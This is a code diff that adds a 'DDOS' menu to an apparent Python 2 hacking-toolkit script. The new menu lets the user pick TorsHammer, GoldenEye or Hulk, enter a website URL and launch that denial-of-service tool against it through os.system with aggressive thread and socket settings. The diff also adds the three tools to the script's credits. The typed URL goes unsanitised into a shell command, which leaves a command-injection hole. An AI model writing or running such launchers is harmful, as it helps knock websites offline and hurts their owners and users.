@@ -138,6 +138,29 @@ def Hash():
  elif hasher == "2":
   os.system("cd modules/hasher && python2 hash.py")
 
+def ddos():
+ netcheck()
+ print(colored("""
+  #########################
+  1. TorshHammer
+  2. GoldenEye
+  3. Hulk
+  ########################
+  """, "green"))
+ dos = raw_input("DDOS > ")
+ if dos == "1":
+  print(colored("""Enter Website Link""", "green"))
+  dos1 = raw_input("url > ")
+  os.system("cd modules/torshammer/ && python2 torshammer.py -t "+ dos1 +" -r 256")
+ elif dos == "2":
+  print(colored("""Enter Website Link""", "green"))
+  dos2 = raw_input("url > ")
+  os.system("cd modules/GoldenEye/ && python2 goldeneye.py "+ dos2 +" -w 10 -s 500")
+ elif dos == "3":
+  print(colored("""Enter Website Link""", "green"))
+  print(colored("""Hulk is unstable""", "red"))
+  dos3 = raw_input("url > ")
+  os.system("cd modules/hulk && python2 hulk.py "+ dos3 +" safe")
 ####BASIC LEVEL
 
 def battery():
@@ -192,6 +215,9 @@ def credit():
   Red_Hawk		Tuhinshubhra
   Hasher		CiKu370
   SCANNER-INURLBR	GoogleINURL
+  TorsHammer
+  Hulk
+  GoldenEye
   ####################################
   """, "green"))
 
